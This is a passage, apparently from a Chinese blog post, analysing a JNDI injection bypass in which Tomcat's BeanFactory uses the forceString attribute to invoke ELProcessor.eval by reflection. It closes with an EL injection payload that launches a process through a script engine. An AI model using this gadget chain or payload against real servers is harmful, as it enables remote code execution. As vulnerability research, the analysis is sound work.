其它的调用和上面讲的一样，我们需要注意的是javax.naming.spi.NamingManager#getObjectInstance此处的调用，可以看到该方法中通过getObjectFactoryFromReference获取一个实例化的对象之后，还会调用factory.getObjectInstance，也就是说如果我们能从其它类中找到其它可以利用的getObjectInstance方法，那么我们就可以进行进一步的利用。

```java
factory = getObjectFactoryFromReference(ref, f);
if (factory != null) {
    return factory.getObjectInstance(ref, name, nameCtx,
                                     environment);
}
```

然后到了我们上面所说的可利用的类：org.apache.naming.factory.BeanFactory，该类存在getObjectInstance方法，如下

```java
public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws NamingException {
    if (obj instanceof ResourceRef) {
        NamingException ne;
        try {
            Reference ref = (Reference)obj;
            String beanClassName = ref.getClassName();
            Class<?> beanClass = null;
            ClassLoader tcl = Thread.currentThread().getContextClassLoader();
            if (tcl != null) {
                try {
                    beanClass = tcl.loadClass(beanClassName);
                } catch (ClassNotFoundException var26) {
                }
            } else {
                try {
                    beanClass = Class.forName(beanClassName);
                } catch (ClassNotFoundException var25) {
                    var25.printStackTrace();
                }
            }

            if (beanClass == null) {
                throw new NamingException("Class not found: " + beanClassName);
            } else {
                BeanInfo bi = Introspector.getBeanInfo(beanClass);
                PropertyDescriptor[] pda = bi.getPropertyDescriptors();
                Object bean = beanClass.newInstance();
                RefAddr ra = ref.get("forceString");
                Map<String, Method> forced = new HashMap();
                String value;
                String propName;
                int i;
                if (ra != null) {
                    value = (String)ra.getContent();
                    Class<?>[] paramTypes = new Class[]{String.class};
                    String[] arr$ = value.split(",");
                    i = arr$.length;

                    for(int i$ = 0; i$ < i; ++i$) {
                        String param = arr$[i$];
                        param = param.trim();
                        int index = param.indexOf(61);
                        if (index >= 0) {
                            propName = param.substring(index + 1).trim();
                            param = param.substring(0, index).trim();
                        } else {
                            propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
                        }

                        try {
                            forced.put(param, beanClass.getMethod(propName, paramTypes));
                        } catch (SecurityException | NoSuchMethodException var24) {
                            throw new NamingException("Forced String setter " + propName + " not found for property " + param);
                        }
                    }
                }

                Enumeration e = ref.getAll();

                while(true) {
                    while(true) {
                        do {
                            do {
                                do {
                                    do {
                                        do {
                                            if (!e.hasMoreElements()) {
                                                return bean;
                                            }

                                            ra = (RefAddr)e.nextElement();
                                            propName = ra.getType();
                                        } while(propName.equals("factory"));
                                    } while(propName.equals("scope"));
                                } while(propName.equals("auth"));
                            } while(propName.equals("forceString"));
                        } while(propName.equals("singleton"));

                        value = (String)ra.getContent();
                        Object[] valueArray = new Object[1];
                        Method method = (Method)forced.get(propName);
                        if (method != null) {
                            valueArray[0] = value;

                            try {
                                method.invoke(bean, valueArray);
                            } catch (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) {
                                throw new NamingException("Forced String setter " + method.getName() + " threw exception for property " + propName);
                            }
                        } else {
                            //省略部分代码
                        }
                    }
                }
            }
        }
        //省略部分代码
    } else {
        return null;
    }
}
```

可以看到该方法中有反射的调用method.invoke(bean, valueArray);并且反射所有参数均来自Reference，反射的类来自Object bean = beanClass.newInstance();，这里是ELProcessor

然后就是调用的参数，以=号分割，=右边为调用的方法，这里为javax.el.ELProcessor.eval；=左边则是会通过作为hashmap的key，后续会通过key去获取javax.el.ELProcessor.eval。

```java
int index = param.indexOf(61);
if (index >= 0) {
    propName = param.substring(index + 1).trim();
    param = param.substring(0, index).trim();
} else {
    propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
}

try {
    forced.put(param, beanClass.getMethod(propName, paramTypes));
} catch (SecurityException | NoSuchMethodException var24) {
    throw new NamingException("Forced String setter " + propName + " not found for property " + param);
}
```

其中eval的参数获取如下，可以看到它是通过嵌套多次do while去枚举e中的元素，最后while(propName.equals("singleton"))此处propName为x，则退出循环，然后通过value = (String)ra.getContent();获取eval的参数，之后就是将ra的addrType（propName）的值作为key去获取之前存入的javax.el.ELProcessor.eval：Method method = (Method)forced.get(propName);

```java
Enumeration e = ref.getAll();

do {
    do {
        do {
            do {
                do {
                    if (!e.hasMoreElements()) {
                        return bean;
                    }

                    ra = (RefAddr)e.nextElement();
                    propName = ra.getType();
                } while(propName.equals("factory"));
            } while(propName.equals("scope"));
        } while(propName.equals("auth"));
    } while(propName.equals("forceString"));
} while(propName.equals("singleton"));

value = (String)ra.getContent();
Object[] valueArray = new Object[1];
Method method = (Method)forced.get(propName);
if (method != null) {
    valueArray[0] = value;
}
```

参数如下：

[![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221640261.png)](https://i.loli.net/2020/08/18/pfgwCZkzHvP9ESU.png)

最终通过el注入实现RCE，反射执行的语句可以整理为如下：

```java
(new ELProcessor()).eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new
java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")");
```

[![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221640899.png)

## 版本总结

![img](https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304221654874.png)
